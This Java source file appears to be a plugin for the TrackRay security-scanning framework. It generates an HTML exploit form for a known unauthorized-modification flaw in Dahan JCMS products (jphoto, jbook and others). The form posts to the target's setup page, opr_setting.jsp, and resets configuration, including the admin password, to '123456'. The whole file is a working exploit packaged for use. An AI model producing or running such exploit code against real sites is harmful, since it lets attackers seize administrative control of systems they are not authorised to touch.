package com.trackray.module.plugin.webapp.jcms;


import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;

import java.util.Map;

@Rule(params = {@Param(key = "target", desc = "目标地址"),} , type = CommonPlugin.Type.HTML)
@Plugin(title = "大汉jbook、jget、jvideo、source、jphoto越权修改" , link = "http://www.anquan.us/static/bugs/wooyun-2014-052747.html", author = "浅蓝" )
public class JPhotoSetupBypass extends CommonPlugin{

    String str = "<html>\n" +
            "\n" +
            "<form action=\"http://%s/setup/opr_setting.jsp\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\">\n" +
            "\n" +
            "<input type=\"file\" name=\"file\" size=\"23\" id=\"file\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"jndi\" value=\"jsp.jsp \" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"servername\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"debug1\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"dbtype\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"dbtypename\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"ldapV\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"dbtypename\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"adminpwd\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"initapps\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"hidden\" name=\"sso\" value=\"123456\" />\n" +
            "\n" +
            "<input type=\"submit\" value=\"Submit\" />\n" +
            "\n" +
            "</form>\n" +
            "\n" +
            "</html>";

    @Override
    public boolean check(Map param) {
        String target = param.get("target").toString();
        str = String.format(str,target);
        return true;
    }

    @Override
    public Object start() {
        return str;
    }
}
